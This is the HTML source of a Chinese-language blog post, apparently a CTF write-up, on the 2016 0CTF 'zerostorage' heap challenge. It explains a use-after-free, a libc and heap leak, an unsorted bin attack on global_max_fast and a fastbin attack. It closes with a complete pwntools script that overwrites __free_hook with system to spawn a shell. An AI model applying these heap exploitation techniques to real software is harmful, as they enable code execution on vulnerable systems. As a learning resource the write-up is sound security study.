@@ -1,0 +1,871 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="use-after-free,unsorted bin attack,fastbin unlink attack,PIE,RELRO,offset2libc," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="Challenge这个题难度是比较大的，但是必须要多做难题才行，不然一到线下赛就只能gg了。逆向出来一个结构体：123456struct storage&amp;#123;	unsigned long used;	unsigned long length;	unsigned long pointer;  /*handling by xor*/&amp;#125;">
+<meta name="keywords" content="use-after-free,unsorted bin attack,fastbin unlink attack,PIE,RELRO,offset2libc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2016 0CTF zerostorage">
+<meta property="og:url" content="http://yoursite.com/2017/03/17/2016-0CTF-zerostorage/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="Challenge这个题难度是比较大的，但是必须要多做难题才行，不然一到线下赛就只能gg了。逆向出来一个结构体：123456struct storage&amp;#123;	unsigned long used;	unsigned long length;	unsigned long pointer;  /*handling by xor*/&amp;#125;">
+<meta property="og:updated_time" content="2017-11-16T13:43:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2016 0CTF zerostorage">
+<meta name="twitter:description" content="Challenge这个题难度是比较大的，但是必须要多做难题才行，不然一到线下赛就只能gg了。逆向出来一个结构体：123456struct storage&amp;#123;	unsigned long used;	unsigned long length;	unsigned long pointer;  /*handling by xor*/&amp;#125;">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/03/17/2016-0CTF-zerostorage/"/>
+
+
+  <title> 2016 0CTF zerostorage | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                2016 0CTF zerostorage
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2017-03-17T10:28:21+08:00" content="2017-03-17">
+              2017-03-17
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/ctf-practice/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf_practice</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/03/17/2016-0CTF-zerostorage/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/03/17/2016-0CTF-zerostorage/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><p>这个题难度是比较大的，但是必须要多做难题才行，不然一到线下赛就只能gg了。<br>逆向出来一个结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">storage</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> used;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> length;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pointer;  <span class="comment">/*handling by xor*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>然后是堆块的分配都被控制在128-4096之间，说白了就是无法分配fastbin堆块。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h3><p>merge选项的函数存在use after free漏洞。如果merge_to_id和merge_from_id相同的话，函数会先realloc merge_to_id相应的堆块，然后又会free merge_from_id相应的堆块，这样就能任意读写这个堆块了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---------------------------</div><div class="line">|index|used|length|pointer|</div><div class="line">| <span class="number">0</span>   | <span class="number">1</span>  |  n   |<span class="number">0xabfd0</span>|</div><div class="line">| <span class="number">1</span>   | <span class="number">0</span>  |  <span class="number">0</span>   |   <span class="number">0</span>   |</div><div class="line">| <span class="number">2</span>   | <span class="number">1</span>  |  m   |<span class="number">0xabcd0</span>|</div><div class="line">---------------------------</div></pre></td></tr></table></figure></p>
+<p>当两个id的值都是1的时候，realloc后返回的指针(经过xor)存放于index为2的位置的结构体数组中。然后又会从id为1的数组中取出指针处理后free。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-----------------------</div><div class="line">| -----------         |  ----------   <span class="comment">/*chunk 1是free的堆块*/</span></div><div class="line">| | chunk <span class="number">1</span> | chunk <span class="number">2</span> |  | chunk <span class="number">3</span>|   <span class="comment">/*chunk 2是realloc的堆块*/</span></div><div class="line">| -----------         |  ----------   <span class="comment">/*chunk 1和chunk 2是同一位置相同大小的堆块</span></div><div class="line">-----------------------</div><div class="line">0x123450</div></pre></td></tr></table></figure></p>
+<p>先分配几个堆块，然后free其中一个堆块(不能是最后一个堆块，否则会和top chunk合并),然后merge两个相同id的堆块(也不能是最后一块)，这时候这个use-after-free的堆块中会有libc和前一个堆块的地址。由此，我们可以泄露libc和heap的地址。<br>例如：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">insert(<span class="number">8</span>)  <span class="comment">/* chunk 0*/</span></div><div class="line">insert(<span class="number">8</span>)  <span class="comment">/* chunk 1*/</span></div><div class="line">insert(<span class="number">8</span>)  <span class="comment">/* chunk 2*/</span></div><div class="line">insert(<span class="number">8</span>)  <span class="comment">/* chunk 3*/</span></div><div class="line"></div><div class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</div><div class="line">merge(<span class="number">2</span>, <span class="number">2</span>)</div></pre></td></tr></table></figure></p>
+<p>这时候chunk 2就是能use-after-free的那个堆块。此时unsorted bin中有chunk 0和chunk 2。chunk header如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"> ---------------------      ---------------------      -------</div><div class="line"> |pre_size|size|fd|bk|      |pre_size|size|fd|bk|      |fd|bk|</div><div class="line"> ---------------------      ---------------------      -------</div><div class="line">  chunk <span class="number">0</span>                     chunk <span class="number">2</span>                  unsorted bin</div><div class="line"></div><div class="line">unsortedbin.fd = chunk <span class="number">2</span></div><div class="line">unsortedbin.bk = chunk <span class="number">0</span></div><div class="line"></div><div class="line">chunk2.fd = chunk <span class="number">0</span></div><div class="line">chunk2.bk = unsortedbin</div><div class="line"></div><div class="line">chunk0.fd = unsortedbin</div><div class="line">chunk0.bk = chunk <span class="number">2</span></div></pre></td></tr></table></figure></p>
+<p>这时view chunk 2就能leak堆和libc的地址了。</p>
+<h3 id="Unsorted-bin-attack-FIFO"><a href="#Unsorted-bin-attack-FIFO" class="headerlink" title="Unsorted bin attack(FIFO)"></a>Unsorted bin attack(FIFO)</h3><p>好早就知道这种利用方式，只是一直没做这类题，上次看那个how2heap本来想做一下这题的，可是一直拖到现在。<br>感觉这个方法威力很强啊，能造成一次内存写的机会！(虽然不能控制内容)还是来分析分析源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (;; )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</div><div class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</div><div class="line">        &#123;</div><div class="line">          bck = victim-&gt;bk;</div><div class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</div><div class="line">            malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</div><div class="line">                             chunk2mem (victim));</div><div class="line">          size = chunksize (victim);</div><div class="line"></div><div class="line">          <span class="comment">/*......*/</span></div><div class="line"></div><div class="line">          <span class="comment">/* remove from unsorted list */</span></div><div class="line">          unsorted_chunks (av)-&gt;bk = bck;  <span class="comment">//op1</span></div><div class="line">          bck-&gt;fd = unsorted_chunks (av);  <span class="comment">//op2</span></div></pre></td></tr></table></figure></p>
+<p>只要我们能控制最近加到unsorted bin中的chunk的bk字段(即victim-&gt;bk)，那就能造成一次恶意的内存写。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">        ---------------------&gt;&gt;&gt;---------</div><div class="line">        |                               |</div><div class="line">-----------    ---------   ---------    ---------------------</div><div class="line">| fd | bk |    | chunk |   | chunk |    |pre_size|size|fd|bk|</div><div class="line">-----------    ---------   ---------    ---------------------</div><div class="line">         |                    ||                       |  ||</div><div class="line">         --------------------&lt;&lt;&lt;------------&lt;&lt;&lt;-------------</div><div class="line"> bin <span class="number">1</span>    <span class="function">chunk <span class="title">A</span><span class="params">(high memory)</span> chunk B   Last in <span class="title">chunk</span><span class="params">(low memory)</span></span></div></pre></td></tr></table></figure>
+<p>我们把bk字段设置为我们想要overwrite的address(实际上是addr-0x10)，当进行op1操作时，bin 1的bk字段被赋值为bck，即我们控制的bk字段。当进行op2操作时，address会被赋值为unsorted bin的地址，即bin 1的地址。只要重新malloc漏洞就会触发。</p>
+<p>这题可以overwrite global_max_fast的值为unsorted bin的地址(肯定很大)，这样以后分配的chunk都会被当做fastbin来处理。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">insert(<span class="number">8</span>)  <span class="comment">/* remove chunk 0 from unsorted bin */</span></div><div class="line">update(p, <span class="string">'a'</span>*+ p64(global_max_fast_addr - <span class="number">0x10</span>))  <span class="comment">/*把chunk 2的bk字段改为我们想要覆盖的addr-0x10*/</span></div><div class="line">insert(<span class="number">8</span>)  <span class="comment">/*此时global_max_fast会被overwrite为unsortedbin的地址。</span></div></pre></td></tr></table></figure>
+<p>前面说unsroted bin中此时有chunk 0和chunk 2，但是当再遇到malloc时，glibc会先拿chunk 0进行分配。所以我们得先把chunk 0从unsorted bin中移除。</p>
+<h3 id="Fast-bin-unlink-attack-LIFO"><a href="#Fast-bin-unlink-attack-LIFO" class="headerlink" title="Fast bin unlink attack(LIFO)"></a>Fast bin unlink attack(LIFO)</h3><p>OK，虽然这种方法比较简单，但是还是记录一下。这题确实要对堆的分配相当熟悉才行。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">+----+----+-----+----+</div><div class="line">|    |    |<span class="number">0x100</span>|    |</div><div class="line">+----+----+-----+----+</div><div class="line">             |     ------------</div><div class="line">             |----&gt;|fd=null|bk|</div><div class="line">                   ------------</div><div class="line">                   <span class="number">0x100</span></div></pre></td></tr></table></figure>
+<p>假设此时fastbin中的一个bin情况如上，当free一个和它相同大小的chunk时，会加入这个bin中，此时：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">+----+----+-----+----+</div><div class="line">|    |    |<span class="number">0x140</span>|    |</div><div class="line">+----+----+-----+----+</div><div class="line">             |     -------------</div><div class="line">             |----&gt;|fd=<span class="number">0x100</span>|bk| <span class="number">0x200</span></div><div class="line">                   -------------</div><div class="line">                     |     ------------</div><div class="line">                     |----&gt;|fd=null|bk| <span class="number">0x100</span></div><div class="line">                           ------------</div></pre></td></tr></table></figure></p>
+<p>当下次分配此fastbin中的chunk时，该fastbin的首个chunk即0x200处的chunk会被分配，此时就剩0x100处的chunk。<br>假设我们能控制0x200处的chunk，我们把fd字段改为我们想要控制的内存区域的首地址，那样再它分配完后，该fastbin中的唯一的chunk的地址会变成我们控制的地址。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">+----+----+-----------+----+</div><div class="line">|    |    |target_addr|    |</div><div class="line">+----+----+-----------+----+</div></pre></td></tr></table></figure></p>
+<p>此时再分配相同大小的chunk，那么malloc会返回target_addr+0x10。不过需要注意的是，我们需要在那里构造一个满足条件的size字段来通过检查。否则size字段不满足就无法分配这个区域的内存。</p>
+<h3 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">debug = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> debug:</div><div class="line">  <span class="comment">#context.log_level = "true"</span></div><div class="line">  p = process(<span class="string">'./zerostorage'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">  <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(len, data = <span class="string">''</span>)</span>:</span></div><div class="line">  p.recvuntil(<span class="string">"Your choice: "</span>)</div><div class="line">  p.sendline(<span class="string">'1'</span>)</div><div class="line">  p.recvuntil(<span class="string">"Length of new entry: "</span>)</div><div class="line">  p.sendline(str(len))</div><div class="line">  p.recvuntil(<span class="string">"Enter your data: "</span>)</div><div class="line">  data = data.ljust(len, <span class="string">'a'</span>)</div><div class="line">  <span class="comment">#print data</span></div><div class="line">  p.send(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index, nlen, data)</span>:</span></div><div class="line">  p.recvuntil(<span class="string">"Your choice: "</span>)</div><div class="line">  p.sendline(<span class="string">'2'</span>)</div><div class="line">  p.recvuntil(<span class="string">"Entry ID: "</span>)</div><div class="line">  p.sendline(str(index))</div><div class="line">  p.recvuntil(<span class="string">"Length of entry: "</span>)</div><div class="line">  p.sendline(str(nlen))</div><div class="line">  p.recvuntil(<span class="string">"Enter your data: "</span>)</div><div class="line">  p.send(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(index1, index2)</span>:</span></div><div class="line">  p.recvuntil(<span class="string">"Your choice: "</span>)</div><div class="line">  p.sendline(<span class="string">'3'</span>)</div><div class="line">  p.recvuntil(<span class="string">"Merge from Entry ID: "</span>)</div><div class="line">  p.sendline(str(index1))</div><div class="line">  p.recvuntil(<span class="string">"Merge to Entry ID: "</span>)</div><div class="line">  p.sendline(str(index2))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></div><div class="line">  p.recvuntil(<span class="string">"Your choice: "</span>)</div><div class="line">  p.sendline(<span class="string">'4'</span>)</div><div class="line">  p.recvuntil(<span class="string">"Entry ID: "</span>)</div><div class="line">  p.sendline(str(index))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></div><div class="line">  p.recvuntil(<span class="string">"Your choice: "</span>)</div><div class="line">  p.sendline(<span class="string">'5'</span>)</div><div class="line">  p.recvuntil(<span class="string">"Entry ID: "</span>)</div><div class="line">  p.sendline(str(index))</div><div class="line">  p.recvline()</div><div class="line">  addr1 = u64( p.recv(<span class="number">8</span>) )</div><div class="line">  addr2 = u64( p.recv(<span class="number">8</span>) )</div><div class="line">  <span class="keyword">return</span> (addr1, addr2)</div><div class="line"></div><div class="line"></div><div class="line">insert(<span class="number">8</span>) <span class="comment">#0   at leat 8, because the view function outputs the addresses</span></div><div class="line">insert(<span class="number">8</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#0, 1</span></div><div class="line">insert(<span class="number">8</span>) <span class="comment">#0, 1, 2</span></div><div class="line">insert(<span class="number">8</span>) <span class="comment">#0, 1, 2, 3 in case consolidating with top chunk</span></div><div class="line">insert(<span class="number">8</span>) <span class="comment">#0, 1, 2, 3, 4  becuse of merge(3, 3)</span></div><div class="line">insert(<span class="number">0x90</span>) <span class="comment">#0, 1, 2, 3, 4, 5  #prepare for later fastbin unlink attack. checking the size to malloc the fastbin whether is 0x90</span></div><div class="line">delete(<span class="number">0</span>) <span class="comment">#1, 2, 3, 4, 5</span></div><div class="line"></div><div class="line">merge(<span class="number">2</span>, <span class="number">2</span>) <span class="comment">#0, 1, 3, 4, 5</span></div><div class="line"></div><div class="line"><span class="comment">#raw_input("go")</span></div><div class="line"></div><div class="line">heap_addr, unsorted_bin_addr = view(<span class="number">0</span>)   <span class="comment">#use afrer free to read the content of the chunk</span></div><div class="line"><span class="keyword">print</span> <span class="string">"\n[*]unsorted_bin_addr: "</span> + hex(unsorted_bin_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"[*]heap_addr: "</span> + hex(heap_addr)</div><div class="line"></div><div class="line"><span class="comment">#raw_input("go?")</span></div><div class="line">libc_base_addr = unsorted_bin_addr - <span class="number">0x3BE7B8</span> <span class="comment">#find main_arena's address in free(libc.so)(__libc_free)</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[*]libc_base_addr: "</span> + hex(libc_base_addr)</div><div class="line"></div><div class="line"><span class="comment">#system's address</span></div><div class="line">system_addr = libc_base_addr + <span class="number">0x46590</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[*]system_addr: "</span> + hex(system_addr)</div><div class="line"></div><div class="line"><span class="comment">#global_max_fast's address</span></div><div class="line">global_max_fast_addr = libc_base_addr + <span class="number">0x3C0B40</span>  <span class="comment">#find in free--&gt;_int_free</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[*]global_max_fast_addr: "</span> + hex(global_max_fast_addr)</div><div class="line"></div><div class="line"><span class="comment">#__free_hook's address</span></div><div class="line">free_hook_addr = libc_base_addr + <span class="number">0x3C0A10</span>  <span class="comment">#global variable in bss</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[*]free_hook_addr: "</span> + hex(free_hook_addr)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#and now the problem is how to get the address of executeble file.</span></div><div class="line">pie_addr = libc_base_addr + <span class="number">0x5EA000</span>  <span class="comment">#offset2libc</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[*]PIE_addr: "</span> + hex(pie_addr)</div><div class="line"></div><div class="line">bss_addr = pie_addr + <span class="number">0x203020</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[*]bss_addr: "</span> + hex(bss_addr)</div><div class="line"><span class="comment">#raw_input("go")</span></div><div class="line"></div><div class="line"><span class="comment">#now let's overwrite the global_max_fast using unsorted bin attack</span></div><div class="line">insert(<span class="number">8</span>) <span class="comment">#0, 1, 2, 3, 4, 5  #becuse of fastbin's FIRST IN FIRST OUT, so we must malloc the first one chunk in unsorted bin</span></div><div class="line">update( <span class="number">0</span>, <span class="number">16</span>, <span class="string">'a'</span> * <span class="number">8</span> + p64(global_max_fast_addr - <span class="number">0x10</span>) )</div><div class="line">insert(<span class="number">8</span>) <span class="comment">#0, 1, 2, 3, 4, 5, 6</span></div><div class="line"><span class="comment">#raw_input("\n[*]Finished overwrite global_max_fast. Go?\n")</span></div><div class="line"></div><div class="line"><span class="comment">#now let's take a fastbin unlink attack</span></div><div class="line">merge(<span class="number">3</span>, <span class="number">3</span>) <span class="comment">#0, 1, 2, 4, 5, 6, 7  #first link into fastbin and causing uaf</span></div><div class="line">update(<span class="number">7</span>, <span class="number">8</span>, p64(bss_addr + <span class="number">0x40</span> + <span class="number">24</span> * <span class="number">5</span>) )</div><div class="line">insert(<span class="number">8</span>) <span class="comment">#0, 1, 2, 3, 4, 5, 6, 7</span></div><div class="line">insert(<span class="number">80</span>) <span class="comment">#0, 1, 2, 3, 4, 5, 6, 7, 8, no.8--&gt;bss,also array no.5</span></div><div class="line"></div><div class="line"><span class="comment">#next is to get the key</span></div><div class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</div><div class="line">p.sendline(<span class="string">'5'</span>)</div><div class="line">p.recvuntil(<span class="string">"Entry ID: "</span>)</div><div class="line">p.sendline(<span class="string">'8'</span>)</div><div class="line">p.recvuntil(<span class="string">"Entry No.8:\n"</span>)</div><div class="line">r = p.recv(<span class="number">80</span>)</div><div class="line">key = u64(r[<span class="number">-8</span>:]) ^ (bss_addr + <span class="number">0x40</span> + <span class="number">24</span> *<span class="number">5</span> + <span class="number">16</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"[*]key: "</span> + hex(key)</div><div class="line"><span class="comment">#raw_input("\n[*]Get key. Go?\n")</span></div><div class="line"></div><div class="line"><span class="comment">#overwrite __free_hook with system</span></div><div class="line">update( <span class="number">8</span>, <span class="number">32</span>, p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">1</span>) + p64(<span class="number">8</span>) + p64(free_hook_addr ^ key) ) <span class="comment">#edit no.6 's pointer </span></div><div class="line"><span class="comment">#raw_input("\n[*]replaced no.6's pointer!go?")</span></div><div class="line"></div><div class="line"><span class="comment">#trigger free to call system</span></div><div class="line">update( <span class="number">6</span>, <span class="number">8</span>, p64(system_addr) )</div><div class="line">delete(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"[*]Get a shell!\n"</span></div><div class="line"></div><div 